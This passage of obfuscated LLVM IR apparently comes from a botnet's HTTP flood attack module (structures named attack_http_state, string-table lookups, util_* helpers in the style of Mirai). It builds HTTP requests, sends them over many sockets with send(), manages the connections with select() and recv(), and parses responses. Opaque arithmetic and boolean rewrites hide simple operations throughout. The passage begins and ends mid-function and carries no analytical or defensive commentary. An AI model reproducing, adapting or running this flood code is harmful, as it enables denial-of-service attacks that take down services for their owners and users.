  %829 = sext i32 %828 to i64
  %830 = getelementptr inbounds i8, i8* %826, i64 %829
  %831 = call i8* @util_itoa(i32 %825, i32 10, i8* %830)
  %832 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %833 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %834 = call i32 @util_strlen(i8* %833)
  %835 = sext i32 %834 to i64
  %836 = getelementptr inbounds i8, i8* %832, i64 %835
  %837 = call i32 @util_strcpy(i8* %836, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  br label %838

; <label>:838:                                    ; preds = %797, %685
  %839 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %840 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %839, i32 0, i32 15
  %841 = load i32, i32* %840, align 4
  %842 = icmp sgt i32 %841, 0
  br i1 %842, label %843, label %888

; <label>:843:                                    ; preds = %838
  %844 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %845 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %846 = call i32 @util_strlen(i8* %845)
  %847 = sext i32 %846 to i64
  %848 = getelementptr inbounds i8, i8* %844, i64 %847
  %849 = call i32 @util_strcpy(i8* %848, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.6, i32 0, i32 0))
  store i32 0, i32* %10, align 4
  br label %850

; <label>:850:                                    ; preds = %875, %843
  %851 = load i32, i32* %10, align 4
  %852 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %853 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %852, i32 0, i32 15
  %854 = load i32, i32* %853, align 4
  %855 = icmp slt i32 %851, %854
  br i1 %855, label %856, label %881

; <label>:856:                                    ; preds = %850
  %857 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %858 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %859 = call i32 @util_strlen(i8* %858)
  %860 = sext i32 %859 to i64
  %861 = getelementptr inbounds i8, i8* %857, i64 %860
  %862 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %863 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %862, i32 0, i32 16
  %864 = load i32, i32* %10, align 4
  %865 = sext i32 %864 to i64
  %866 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %863, i64 0, i64 %865
  %867 = getelementptr inbounds [128 x i8], [128 x i8]* %866, i32 0, i32 0
  %868 = call i32 @util_strcpy(i8* %861, i8* %867)
  %869 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %870 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %871 = call i32 @util_strlen(i8* %870)
  %872 = sext i32 %871 to i64
  %873 = getelementptr inbounds i8, i8* %869, i64 %872
  %874 = call i32 @util_strcpy(i8* %873, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.7, i32 0, i32 0))
  br label %875

; <label>:875:                                    ; preds = %856
  %876 = load i32, i32* %10, align 4
  %877 = sub i32 %876, 1827889985
  %878 = add i32 %877, 1
  %879 = add i32 %878, 1827889985
  %880 = add nsw i32 %876, 1
  store i32 %879, i32* %10, align 4
  br label %850

; <label>:881:                                    ; preds = %850
  %882 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %883 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %884 = call i32 @util_strlen(i8* %883)
  %885 = sext i32 %884 to i64
  %886 = getelementptr inbounds i8, i8* %882, i64 %885
  %887 = call i32 @util_strcpy(i8* %886, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  br label %888

; <label>:888:                                    ; preds = %881, %838
  %889 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %890 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %891 = call i32 @util_strlen(i8* %890)
  %892 = sext i32 %891 to i64
  %893 = getelementptr inbounds i8, i8* %889, i64 %892
  %894 = call i32 @util_strcpy(i8* %893, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0))
  %895 = load i8*, i8** %14, align 8
  %896 = icmp ne i8* %895, null
  br i1 %896, label %897, label %905

; <label>:897:                                    ; preds = %888
  %898 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %899 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %900 = call i32 @util_strlen(i8* %899)
  %901 = sext i32 %900 to i64
  %902 = getelementptr inbounds i8, i8* %898, i64 %901
  %903 = load i8*, i8** %14, align 8
  %904 = call i32 @util_strcpy(i8* %902, i8* %903)
  br label %905

; <label>:905:                                    ; preds = %897, %888
  %906 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %907 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %906, i32 0, i32 9
  %908 = getelementptr inbounds [9 x i8], [9 x i8]* %907, i32 0, i32 0
  %909 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %910 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %909, i32 0, i32 10
  %911 = getelementptr inbounds [9 x i8], [9 x i8]* %910, i32 0, i32 0
  %912 = call signext i8 @util_strcmp(i8* %908, i8* %911)
  %913 = icmp ne i8 %912, 0
  br i1 %913, label %922, label %914

; <label>:914:                                    ; preds = %905
  %915 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %916 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %915, i32 0, i32 9
  %917 = getelementptr inbounds [9 x i8], [9 x i8]* %916, i32 0, i32 0
  %918 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %919 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %918, i32 0, i32 10
  %920 = getelementptr inbounds [9 x i8], [9 x i8]* %919, i32 0, i32 0
  %921 = call i32 @util_strcpy(i8* %917, i8* %920)
  br label %922

; <label>:922:                                    ; preds = %914, %905
  %923 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %924 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %923, i32 0, i32 0
  %925 = load i32, i32* %924, align 4
  %926 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %927 = getelementptr inbounds [10240 x i8], [10240 x i8]* %34, i32 0, i32 0
  %928 = call i32 @util_strlen(i8* %927)
  %929 = sext i32 %928 to i64
  %930 = call i64 @send(i32 %925, i8* %926, i64 %929, i32 16384)
  %931 = load i32, i32* %27, align 4
  %932 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %933 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %932, i32 0, i32 3
  store i32 %931, i32* %933, align 4
  %934 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %935 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %934, i32 0, i32 1
  store i8 6, i8* %935, align 4
  %936 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %937 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %936, i32 0, i32 0
  %938 = load i32, i32* %937, align 4
  %939 = srem i32 %938, 64
  %940 = zext i32 %939 to i64
  %941 = shl i64 1, %940
  %942 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %943 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %944 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %943, i32 0, i32 0
  %945 = load i32, i32* %944, align 4
  %946 = sdiv i32 %945, 64
  %947 = sext i32 %946 to i64
  %948 = getelementptr inbounds [16 x i64], [16 x i64]* %942, i64 0, i64 %947
  %949 = load i64, i64* %948, align 8
  %950 = and i64 %949, %941
  %951 = xor i64 %949, %941
  %952 = or i64 %950, %951
  %953 = or i64 %949, %941
  store i64 %952, i64* %948, align 8
  %954 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %955 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %954, i32 0, i32 0
  %956 = load i32, i32* %955, align 4
  %957 = load i32, i32* %23, align 4
  %958 = icmp sgt i32 %956, %957
  br i1 %958, label %959, label %966

; <label>:959:                                    ; preds = %922
  %960 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %961 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %960, i32 0, i32 0
  %962 = load i32, i32* %961, align 4
  %963 = sub i32 0, 1
  %964 = sub i32 %962, %963
  %965 = add nsw i32 %962, 1
  store i32 %964, i32* %23, align 4
  br label %966

; <label>:966:                                    ; preds = %959, %922
  br label %1147

; <label>:967:                                    ; preds = %679
  %968 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %969 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %968, i32 0, i32 1
  %970 = load i8, i8* %969, align 4
  %971 = zext i8 %970 to i32
  %972 = icmp eq i32 %971, 6
  br i1 %972, label %973, label %1017

; <label>:973:                                    ; preds = %967
  %974 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %975 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %974, i32 0, i32 0
  %976 = load i32, i32* %975, align 4
  %977 = srem i32 %976, 64
  %978 = zext i32 %977 to i64
  %979 = shl i64 1, %978
  %980 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %981 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %982 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %981, i32 0, i32 0
  %983 = load i32, i32* %982, align 4
  %984 = sdiv i32 %983, 64
  %985 = sext i32 %984 to i64
  %986 = getelementptr inbounds [16 x i64], [16 x i64]* %980, i64 0, i64 %985
  %987 = load i64, i64* %986, align 8
  %988 = xor i64 %987, -1
  %989 = xor i64 %979, -1
  %990 = xor i64 6037181622640103046, -1
  %991 = and i64 %988, 6037181622640103046
  %992 = and i64 %987, %990
  %993 = and i64 %989, 6037181622640103046
  %994 = and i64 %979, %990
  %995 = or i64 %991, %992
  %996 = or i64 %993, %994
  %997 = xor i64 %995, %996
  %998 = or i64 %988, %989
  %999 = xor i64 %998, -1
  %1000 = or i64 6037181622640103046, %990
  %1001 = and i64 %999, %1000
  %1002 = or i64 %997, %1001
  %1003 = or i64 %987, %979
  store i64 %1002, i64* %986, align 8
  %1004 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1005 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1004, i32 0, i32 0
  %1006 = load i32, i32* %1005, align 4
  %1007 = load i32, i32* %23, align 4
  %1008 = icmp sgt i32 %1006, %1007
  br i1 %1008, label %1009, label %1016

; <label>:1009:                                   ; preds = %973
  %1010 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1011 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1010, i32 0, i32 0
  %1012 = load i32, i32* %1011, align 4
  %1013 = sub i32 0, 1
  %1014 = sub i32 %1012, %1013
  %1015 = add nsw i32 %1012, 1
  store i32 %1014, i32* %23, align 4
  br label %1016

; <label>:1016:                                   ; preds = %1009, %973
  br label %1146

; <label>:1017:                                   ; preds = %967
  %1018 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1019 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1018, i32 0, i32 1
  %1020 = load i8, i8* %1019, align 4
  %1021 = zext i8 %1020 to i32
  %1022 = icmp eq i32 %1021, 7
  br i1 %1022, label %1023, label %1068

; <label>:1023:                                   ; preds = %1017
  %1024 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1025 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1024, i32 0, i32 0
  %1026 = load i32, i32* %1025, align 4
  %1027 = srem i32 %1026, 64
  %1028 = zext i32 %1027 to i64
  %1029 = shl i64 1, %1028
  %1030 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %1031 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1032 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1031, i32 0, i32 0
  %1033 = load i32, i32* %1032, align 4
  %1034 = sdiv i32 %1033, 64
  %1035 = sext i32 %1034 to i64
  %1036 = getelementptr inbounds [16 x i64], [16 x i64]* %1030, i64 0, i64 %1035
  %1037 = load i64, i64* %1036, align 8
  %1038 = xor i64 %1037, -1
  %1039 = xor i64 %1029, -1
  %1040 = xor i64 -1224613376906325008, -1
  %1041 = and i64 %1038, -1224613376906325008
  %1042 = and i64 %1037, %1040
  %1043 = and i64 %1039, -1224613376906325008
  %1044 = and i64 %1029, %1040
  %1045 = or i64 %1041, %1042
  %1046 = or i64 %1043, %1044
  %1047 = xor i64 %1045, %1046
  %1048 = or i64 %1038, %1039
  %1049 = xor i64 %1048, -1
  %1050 = or i64 -1224613376906325008, %1040
  %1051 = and i64 %1049, %1050
  %1052 = or i64 %1047, %1051
  %1053 = or i64 %1037, %1029
  store i64 %1052, i64* %1036, align 8
  %1054 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1055 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1054, i32 0, i32 0
  %1056 = load i32, i32* %1055, align 4
  %1057 = load i32, i32* %23, align 4
  %1058 = icmp sgt i32 %1056, %1057
  br i1 %1058, label %1059, label %1067

; <label>:1059:                                   ; preds = %1023
  %1060 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1061 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1060, i32 0, i32 0
  %1062 = load i32, i32* %1061, align 4
  %1063 = sub i32 %1062, -2022608072
  %1064 = add i32 %1063, 1
  %1065 = add i32 %1064, -2022608072
  %1066 = add nsw i32 %1062, 1
  store i32 %1065, i32* %23, align 4
  br label %1067

; <label>:1067:                                   ; preds = %1059, %1023
  br label %1145

; <label>:1068:                                   ; preds = %1017
  %1069 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1070 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1069, i32 0, i32 1
  %1071 = load i8, i8* %1070, align 4
  %1072 = zext i8 %1071 to i32
  %1073 = icmp eq i32 %1072, 10
  br i1 %1073, label %1074, label %1119

; <label>:1074:                                   ; preds = %1068
  %1075 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1076 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1075, i32 0, i32 0
  %1077 = load i32, i32* %1076, align 4
  %1078 = srem i32 %1077, 64
  %1079 = zext i32 %1078 to i64
  %1080 = shl i64 1, %1079
  %1081 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %1082 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1083 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1082, i32 0, i32 0
  %1084 = load i32, i32* %1083, align 4
  %1085 = sdiv i32 %1084, 64
  %1086 = sext i32 %1085 to i64
  %1087 = getelementptr inbounds [16 x i64], [16 x i64]* %1081, i64 0, i64 %1086
  %1088 = load i64, i64* %1087, align 8
  %1089 = xor i64 %1088, -1
  %1090 = xor i64 %1080, -1
  %1091 = xor i64 -4009766197675461600, -1
  %1092 = and i64 %1089, -4009766197675461600
  %1093 = and i64 %1088, %1091
  %1094 = and i64 %1090, -4009766197675461600
  %1095 = and i64 %1080, %1091
  %1096 = or i64 %1092, %1093
  %1097 = or i64 %1094, %1095
  %1098 = xor i64 %1096, %1097
  %1099 = or i64 %1089, %1090
  %1100 = xor i64 %1099, -1
  %1101 = or i64 -4009766197675461600, %1091
  %1102 = and i64 %1100, %1101
  %1103 = or i64 %1098, %1102
  %1104 = or i64 %1088, %1080
  store i64 %1103, i64* %1087, align 8
  %1105 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1106 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1105, i32 0, i32 0
  %1107 = load i32, i32* %1106, align 4
  %1108 = load i32, i32* %23, align 4
  %1109 = icmp sgt i32 %1107, %1108
  br i1 %1109, label %1110, label %1118

; <label>:1110:                                   ; preds = %1074
  %1111 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1112 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1111, i32 0, i32 0
  %1113 = load i32, i32* %1112, align 4
  %1114 = sub i32 %1113, -1702688408
  %1115 = add i32 %1114, 1
  %1116 = add i32 %1115, -1702688408
  %1117 = add nsw i32 %1113, 1
  store i32 %1116, i32* %23, align 4
  br label %1118

; <label>:1118:                                   ; preds = %1110, %1074
  br label %1144

; <label>:1119:                                   ; preds = %1068
  %1120 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1121 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1120, i32 0, i32 1
  %1122 = load i8, i8* %1121, align 4
  %1123 = zext i8 %1122 to i32
  %1124 = icmp eq i32 %1123, 11
  br i1 %1124, label %1125, label %1134

; <label>:1125:                                   ; preds = %1119
  %1126 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1127 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1126, i32 0, i32 1
  store i8 0, i8* %1127, align 4
  %1128 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1129 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1128, i32 0, i32 0
  %1130 = load i32, i32* %1129, align 4
  %1131 = call i32 @close(i32 %1130)
  %1132 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1133 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1132, i32 0, i32 0
  store i32 -1, i32* %1133, align 4
  br label %1143

; <label>:1134:                                   ; preds = %1119
  %1135 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1136 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1135, i32 0, i32 1
  store i8 0, i8* %1136, align 4
  %1137 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1138 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1137, i32 0, i32 0
  %1139 = load i32, i32* %1138, align 4
  %1140 = call i32 @close(i32 %1139)
  %1141 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1142 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1141, i32 0, i32 0
  store i32 -1, i32* %1142, align 4
  br label %1143

; <label>:1143:                                   ; preds = %1134, %1125
  br label %1144

; <label>:1144:                                   ; preds = %1143, %1118
  br label %1145

; <label>:1145:                                   ; preds = %1144, %1067
  br label %1146

; <label>:1146:                                   ; preds = %1145, %1016
  br label %1147

; <label>:1147:                                   ; preds = %1146, %966
  br label %1148

; <label>:1148:                                   ; preds = %1147, %678
  br label %1149

; <label>:1149:                                   ; preds = %1148, %608
  br label %1150

; <label>:1150:                                   ; preds = %1149, %625, %524
  %1151 = load i32, i32* %9, align 4
  %1152 = sub i32 %1151, 57616234
  %1153 = add i32 %1152, 1
  %1154 = add i32 %1153, 57616234
  %1155 = add nsw i32 %1151, 1
  store i32 %1154, i32* %9, align 4
  br label %476

; <label>:1156:                                   ; preds = %476
  %1157 = load i32, i32* %23, align 4
  %1158 = icmp eq i32 %1157, 0
  br i1 %1158, label %1159, label %1160

; <label>:1159:                                   ; preds = %1156
  br label %453

; <label>:1160:                                   ; preds = %1156
  %1161 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 1
  store i64 0, i64* %1161, align 8
  %1162 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 0
  store i64 1, i64* %1162, align 8
  %1163 = load i32, i32* %23, align 4
  %1164 = call i32 @select(i32 %1163, %struct.fd_set* %21, %struct.fd_set* %22, %struct.fd_set* null, %struct.timeval* %25)
  store i32 %1164, i32* %24, align 4
  %1165 = call i64 @time(i64* null) #6
  %1166 = trunc i64 %1165 to i32
  store i32 %1166, i32* %27, align 4
  %1167 = load i32, i32* %24, align 4
  %1168 = icmp slt i32 %1167, 1
  br i1 %1168, label %1169, label %1170

; <label>:1169:                                   ; preds = %1160
  br label %453

; <label>:1170:                                   ; preds = %1160
  store i32 0, i32* %9, align 4
  br label %1171

; <label>:1171:                                   ; preds = %2888, %1170
  %1172 = load i32, i32* %9, align 4
  %1173 = load i32, i32* %18, align 4
  %1174 = icmp slt i32 %1172, %1173
  br i1 %1174, label %1175, label %2894

; <label>:1175:                                   ; preds = %1171
  %1176 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %1177 = load i32, i32* %9, align 4
  %1178 = sext i32 %1177 to i64
  %1179 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1176, i64 %1178
  store %struct.attack_http_state* %1179, %struct.attack_http_state** %26, align 8
  %1180 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1181 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1180, i32 0, i32 0
  %1182 = load i32, i32* %1181, align 4
  %1183 = icmp eq i32 %1182, -1
  br i1 %1183, label %1184, label %1185

; <label>:1184:                                   ; preds = %1175
  br label %2888

; <label>:1185:                                   ; preds = %1175
  %1186 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %1187 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1188 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1187, i32 0, i32 0
  %1189 = load i32, i32* %1188, align 4
  %1190 = sdiv i32 %1189, 64
  %1191 = sext i32 %1190 to i64
  %1192 = getelementptr inbounds [16 x i64], [16 x i64]* %1186, i64 0, i64 %1191
  %1193 = load i64, i64* %1192, align 8
  %1194 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1195 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1194, i32 0, i32 0
  %1196 = load i32, i32* %1195, align 4
  %1197 = srem i32 %1196, 64
  %1198 = zext i32 %1197 to i64
  %1199 = shl i64 1, %1198
  %1200 = xor i64 %1199, -1
  %1201 = xor i64 %1193, %1200
  %1202 = and i64 %1201, %1193
  %1203 = and i64 %1193, %1199
  %1204 = icmp ne i64 %1202, 0
  br i1 %1204, label %1205, label %1229

; <label>:1205:                                   ; preds = %1185
  store i32 0, i32* %35, align 4
  store i32 4, i32* %36, align 4
  %1206 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1207 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1206, i32 0, i32 0
  %1208 = load i32, i32* %1207, align 4
  %1209 = bitcast i32* %35 to i8*
  %1210 = call i32 @getsockopt(i32 %1208, i32 1, i32 4, i8* %1209, i32* %36) #6
  store i32 %1210, i32* %12, align 4
  %1211 = load i32, i32* %35, align 4
  %1212 = icmp eq i32 %1211, 0
  br i1 %1212, label %1213, label %1219

; <label>:1213:                                   ; preds = %1205
  %1214 = load i32, i32* %12, align 4
  %1215 = icmp eq i32 %1214, 0
  br i1 %1215, label %1216, label %1219

; <label>:1216:                                   ; preds = %1213
  %1217 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1218 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1217, i32 0, i32 1
  store i8 4, i8* %1218, align 4
  br label %1228

; <label>:1219:                                   ; preds = %1213, %1205
  %1220 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1221 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1220, i32 0, i32 0
  %1222 = load i32, i32* %1221, align 4
  %1223 = call i32 @close(i32 %1222)
  %1224 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1225 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1224, i32 0, i32 0
  store i32 -1, i32* %1225, align 4
  %1226 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1227 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1226, i32 0, i32 1
  store i8 0, i8* %1227, align 4
  br label %2888

; <label>:1228:                                   ; preds = %1216
  br label %1229

; <label>:1229:                                   ; preds = %1228, %1185
  %1230 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %1231 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1232 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1231, i32 0, i32 0
  %1233 = load i32, i32* %1232, align 4
  %1234 = sdiv i32 %1233, 64
  %1235 = sext i32 %1234 to i64
  %1236 = getelementptr inbounds [16 x i64], [16 x i64]* %1230, i64 0, i64 %1235
  %1237 = load i64, i64* %1236, align 8
  %1238 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1239 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1238, i32 0, i32 0
  %1240 = load i32, i32* %1239, align 4
  %1241 = srem i32 %1240, 64
  %1242 = zext i32 %1241 to i64
  %1243 = shl i64 1, %1242
  %1244 = xor i64 %1243, -1
  %1245 = xor i64 %1237, %1244
  %1246 = and i64 %1245, %1237
  %1247 = and i64 %1237, %1243
  %1248 = icmp ne i64 %1246, 0
  br i1 %1248, label %1249, label %2887

; <label>:1249:                                   ; preds = %1229
  %1250 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1251 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1250, i32 0, i32 1
  %1252 = load i8, i8* %1251, align 4
  %1253 = zext i8 %1252 to i32
  %1254 = icmp eq i32 %1253, 6
  br i1 %1254, label %1255, label %2404

; <label>:1255:                                   ; preds = %1249
  store i32 0, i32* %37, align 4
  %1256 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  call void @util_zero(i8* %1256, i32 10240)
  %1257 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1258 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1257, i32 0, i32 0
  %1259 = load i32, i32* %1258, align 4
  %1260 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1261 = call i64 @recv(i32 %1259, i8* %1260, i64 10240, i32 16386)
  %1262 = trunc i64 %1261 to i32
  store i32 %1262, i32* %12, align 4
  %1263 = icmp slt i32 %1262, 1
  br i1 %1263, label %1264, label %1273

; <label>:1264:                                   ; preds = %1255
  %1265 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1266 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1265, i32 0, i32 0
  %1267 = load i32, i32* %1266, align 4
  %1268 = call i32 @close(i32 %1267)
  %1269 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1270 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1269, i32 0, i32 0
  store i32 -1, i32* %1270, align 4
  %1271 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1272 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1271, i32 0, i32 1
  store i8 0, i8* %1272, align 4
  br label %2888

; <label>:1273:                                   ; preds = %1255
  %1274 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1275 = load i32, i32* %12, align 4
  %1276 = call i32 @util_memsearch(i8* %1274, i32 %1275, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  %1277 = icmp eq i32 %1276, -1
  br i1 %1277, label %1278, label %1282

; <label>:1278:                                   ; preds = %1273
  %1279 = load i32, i32* %12, align 4
  %1280 = icmp slt i32 %1279, 10240
  br i1 %1280, label %1281, label %1282

; <label>:1281:                                   ; preds = %1278
  br label %2888

; <label>:1282:                                   ; preds = %1278, %1273
  %1283 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1284 = load i32, i32* %12, align 4
  %1285 = call i32 @util_memsearch(i8* %1283, i32 %1284, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  %1286 = sext i32 %1285 to i64
  %1287 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1286
  store i8 0, i8* %1287, align 1
  %1288 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1289 = load i32, i32* %12, align 4
  %1290 = call i8* @table_retrieve_val(i32 71, i32* null)
  %1291 = call i32 @util_stristr(i8* %1288, i32 %1289, i8* %1290)
  %1292 = icmp ne i32 %1291, -1
  br i1 %1292, label %1293, label %1296

; <label>:1293:                                   ; preds = %1282
  %1294 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1295 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1294, i32 0, i32 11
  store i32 2, i32* %1295, align 4
  br label %1296

; <label>:1296:                                   ; preds = %1293, %1282
  %1297 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1298 = load i32, i32* %12, align 4
  %1299 = call i8* @table_retrieve_val(i32 70, i32* null)
  %1300 = call i32 @util_stristr(i8* %1297, i32 %1298, i8* %1299)
  %1301 = icmp ne i32 %1300, -1
  br i1 %1301, label %1302, label %1305

; <label>:1302:                                   ; preds = %1296
  %1303 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
